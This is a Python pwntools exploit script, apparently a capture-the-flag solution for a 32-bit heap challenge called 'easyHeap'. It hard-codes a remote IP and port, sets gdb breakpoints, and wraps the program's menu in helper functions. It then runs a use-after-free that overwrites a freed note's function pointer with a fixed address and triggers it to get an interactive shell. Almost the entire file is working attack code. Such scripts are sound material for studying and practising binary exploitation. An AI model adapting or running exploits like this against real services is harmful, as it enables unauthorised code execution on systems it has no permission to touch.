from pwn import *
from LibcSearcher import *
import sys
remote_addr = ["43.143.254.94",10898]
#libc=ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./easyHeap")
    context(arch='i386', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        context(arch = 'i386', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

def add(size, content):
    ru(b'Input Option: ')
    s(b'1')
    ru(b'Size: ')
    s(bytes(str(size), encoding='utf-8'))
    ru(b'Content: ')
    s(content)

def delete(idx):
    ru(b'Input Option: ')
    s(b'2')
    ru(b'Note id: ')
    s(bytes(str(idx), encoding='utf-8'))

def show(idx):
    ru(b'Input Option: ')
    s(b'3')
    ru(b'Note id: ')
    s(bytes(str(idx), encoding='utf-8'))


gdb.attach(p, '''
    b *0x080492b4
    b *0x080494b1
    b *0x080495a1
''')

add(0x20, b'aaaa')
add(0x20, b'bbbb')
delete(0)
delete(1)
add(0x8, p32(0x80495bd))
show(0)

shell()
